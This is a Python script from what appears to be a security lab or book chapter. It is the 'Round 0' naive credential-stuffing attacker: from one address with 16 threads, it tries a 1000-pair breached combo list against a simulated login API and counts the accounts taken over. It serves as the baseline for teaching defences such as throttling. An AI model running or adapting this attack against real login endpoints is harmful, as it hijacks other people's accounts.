"""
Round 0 attack: the naive stuffer.

The baseline the whole chapter pushes against: one machine, one IP, 16 workers, the raw 1000-pair
combo list fired at POST /api/login. Against an undefended endpoint it simply walks the list and
collects every valid pair (the 30 accounts that reuse a breached password). It is also the easiest
thing in the world to throttle, which is the point of Round 1.

    python attacks/round0_naive_stuffer.py
"""

from _common import LabClient, combo_list, is_success, login, map_threads, report, world_pool

ACTOR = "bot:naive"
ATTACKER_IP = world_pool("cloud_vm")[0]         # one datacenter address


def run():
    hits = []

    def attempt(pair):
        email, pw = pair
        if is_success(login(LabClient(ACTOR, ip=ATTACKER_IP), email, pw)):
            hits.append(email)

    pairs = combo_list()
    map_threads(attempt, pairs)
    return {"attacker": ACTOR, "attempted": len(pairs), "succeeded": len(hits), "accounts_taken_over": len(hits)}


if __name__ == "__main__":
    out = run()
    print(f"[{ACTOR}] {out['attempted']} attempts -> {out['accounts_taken_over']} accounts taken over")
    report(**out)
